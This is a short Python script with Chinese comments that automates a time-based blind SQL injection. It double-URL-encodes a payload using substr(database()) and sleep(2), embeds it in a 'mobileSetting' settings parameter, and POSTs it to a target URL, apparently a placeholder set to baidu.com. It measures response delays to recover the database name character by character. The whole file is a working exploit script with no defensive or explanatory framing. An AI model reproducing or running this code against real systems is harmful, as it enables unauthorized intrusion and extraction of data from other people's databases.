import requests
import time
import urllib.parse

url = 'https://www.baidu.com'

# URL编码函数
def my_encode(payload):
    encode_payload = ""
    for char in payload:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_payload += encode_char
    return encode_payload

# 构造payload
def construct_payload(payload):
    retVal = my_encode(payload)
    for i in range(1):
        retVal = my_encode(retVal)
    retVal = "type=mobileSetting&timestamp=123&settings=[{%22module%22:%222%22,%22setting%22:%22@"+retVal+"|1%22,%22modulename%22:%22111%22,%22scope%22:%22123%22}]"
    return retVal

# 发送请求并检测响应延迟
def send_request(payload):
    start_time = time.time()
    print(start_time)
    payload =  construct_payload(payload)
    response = requests.post(url, data=payload)
    end_time = time.time()
    return end_time - start_time

# 进行时间盲注攻击
def do_blind_injection():
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    for i in range(1, 50):
        found_char = False
        for character in charset:
            payload = "' or if(substr(database(),{0},1)='{1}', sleep(2), 1) or '1'='1".format(i, character)
            delay = send_request(payload)
            if delay > 2:
                result += character
                print(result)
                break

do_blind_injection() 